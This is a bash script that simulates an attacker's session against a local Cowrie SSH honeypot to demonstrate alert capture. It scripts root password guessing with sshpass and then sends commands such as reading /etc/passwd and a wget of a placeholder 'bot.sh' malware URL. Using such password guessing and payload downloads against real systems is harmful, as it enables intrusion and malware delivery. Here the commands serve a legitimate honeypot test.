#!/bin/bash
# Play a short, scripted attacker session against the local honeypot.
#
# This is your own test traffic, not a real attacker. Present it as a
# demonstration that the capture pipeline works, not as captured attack data.
set -uo pipefail

command -v sshpass >/dev/null || {
  echo "Installing sshpass..."
  apt-get update -qq >/dev/null && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq sshpass >/dev/null
}

OPTS=(-p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
      -o PreferredAuthentications=password -o PubkeyAuthentication=no
      -o ConnectTimeout=5 -o LogLevel=ERROR)

say() { echo; echo ">>> $*"; sleep 1; }

say "Step 1: the attacker guesses common passwords. Cowrie rejects these."
for pw in 123456 root; do
  echo "    trying root / $pw"
  sshpass -p "$pw" ssh "${OPTS[@]}" root@127.0.0.1 true 2>/dev/null || true
done

say "Step 2: the attacker gets in with root / admin123, into Cowrie's FAKE shell."
say "Step 3: the attacker looks around and tries to download malware."
# Typed one line at a time, like a person, so each command finishes (the
# download especially) before the next one arrives.
{
  for cmd in 'uname -a' 'whoami' 'cat /etc/passwd' 'wget http://example.com/bot.sh'; do
    sleep 1.5; echo "$cmd"
  done
  sleep 4; echo exit
} | sshpass -p 'admin123' ssh -tt "${OPTS[@]}" root@127.0.0.1 2>/dev/null

echo
echo "Done. The alerts show up on the dashboard within about 10 seconds."
